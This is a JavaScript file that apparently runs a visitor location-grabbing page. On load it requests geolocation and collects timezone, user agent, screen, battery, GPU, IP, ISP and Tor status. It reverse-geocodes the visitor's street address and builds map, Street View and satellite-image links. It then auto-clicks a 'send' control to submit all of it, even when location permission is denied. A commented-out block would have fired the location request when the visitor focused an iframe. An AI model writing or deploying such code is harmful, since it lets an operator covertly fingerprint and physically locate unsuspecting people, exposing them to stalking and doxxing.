// IFRAME WATCHER & LOCATION POPUP ----------------------------------------------------------------------------------------------------

/* var monitor = setInterval(function(){
    var elem = document.activeElement;
    if(elem && elem.tagName == 'IFRAME'){
        clearInterval(monitor);
        getLocation();
    }
}, 100); */

document.getElementById("time").innerHTML = Intl.DateTimeFormat().resolvedOptions().timeZone;

 getLocation();

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else {
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

// USER AGENT ----------------------------------------------------------------------------------------------------

$.getJSON('https://www.whatsmyua.info/api/v1/ua?ua=' + window.navigator.userAgent, function(data) {
    var agent = data["2"].device.description;
    document.getElementById("usragent").innerHTML = agent;
});

// SCREEN DIMENSIONS & ORIENTATION ----------------------------------------------------------------------------------------------------

document.getElementById("screen").innerHTML = screen.width + " x " + screen.height;

if (window.screen.orientation.type == "landscape-primary") {
document.getElementById("orient").innerHTML = "Landscape";
} else {
    document.getElementById("orient").innerHTML = "Portrait";
}

// BATTERY ----------------------------------------------------------------------------------------------------

let batteryPromise = navigator.getBattery();
batteryPromise.then(batteryCallback);

function batteryCallback(batteryObject) {
   printBatteryStatus(batteryObject);
}
function printBatteryStatus(batteryObject) {
    //console.log("IsCharging", batteryObject.charging);
    //console.log("Percentage", batteryObject.level);
   
    if (batteryObject.charging == true) {
        document.getElementById("battery").innerHTML = batteryObject.level * 100 + "% and charging";
    } else {
     document.getElementById("battery").innerHTML = batteryObject.level * 100 + "% and unplugged" ;  
    }
    
}

// GPU ----------------------------------------------------------------------------------------------------

var canvas = document.createElement('canvas');
var gl;
var renderer;
try {
    gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
} catch (e) {}
if (gl) {
    debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
}
document.getElementById("gpu").innerHTML = renderer;

// TOR & PROXY ----------------------------------------------------------------------------------------------------

$.getJSON('/keys.json', function(data) {
        var key = data.ipdata;

$.getJSON('https://api.ipdata.co?api-key=' + key, function(data) {
    document.getElementById("iploc").innerHTML = data.city+", "+data.region+", "+data.country_name;
    if (data.threat.is_tor == false) {
    document.getElementById("tor").innerHTML = "No";
    } else {
        document.getElementById("tor").innerHTML = "Yes";
    }
        
});
    
});

// IP & ISP ----------------------------------------------------------------------------------------------------

$.getJSON('https://json.geoiplookup.io', function(data) {
    document.getElementById("ip").innerHTML = data.ip; // IP ADDRESS
    document.getElementById("isp").innerHTML = data.org; // ISP
    });

// ADDRESS, COORDS & MAP LINKS ----------------------------------------------------------------------------------------------------

navigator.geolocation.watchPosition(function(position) {},
    function(error) {
        if (error.code == error.PERMISSION_DENIED)

        document.getElementById("street").innerHTML = "Permission denied";
        document.getElementById("address").innerHTML = "Permission denied";
        document.getElementById("maps2").innerHTML = "Permission denied";
        document.getElementById("coords").innerHTML = "Permission denied";
        document.getElementById("maps").innerHTML = "Permission denied";
        document.getElementById("image").innerHTML = "Permission denied";
        document.getElementById("send").click();

    });

function showPosition(position) {
    $.getJSON('/keys.json', function(data) {
        var key = data.geocodio;
        $.getJSON('https://api.geocod.io/v1.6/reverse?q=' + position.coords.latitude + ',' + position.coords.longitude + "&api_key=" + key, function(data) {
            console.log(data);
            var address = data.results["0"].formatted_address;
            document.getElementById("address").innerHTML = address; // ADDRESS
            document.getElementById("maps2").innerHTML = "https://www.google.com/maps/search/?api=1&query=" + address.replace(/\s/g, '+'); // MAPS ADDRESS
        });
    });
    document.getElementById("street").innerHTML = "https://maps.google.com/maps?q=&layer=c&cbll=" + position.coords.latitude + ',' + position.coords.longitude + "&cbp=0,0,0,0,0";
    document.getElementById("image").innerHTML = "https://static-maps.yandex.ru/1.x/?lang=en-US&ll=" + position.coords.longitude + "," + position.coords.latitude + "&z=18&l=sat&size=600,300"; // IMAGE
    document.getElementById("coords").innerHTML = position.coords.latitude + ", " + position.coords.longitude; // COORDS
    document.getElementById("maps").innerHTML = "https://www.google.com/maps/search/?api=1&query=" + position.coords.latitude + "," + position.coords.longitude; // MAPS COORDS
    setTimeout(function(){     
    document.getElementById("send").click();
    }, 1000);    
}
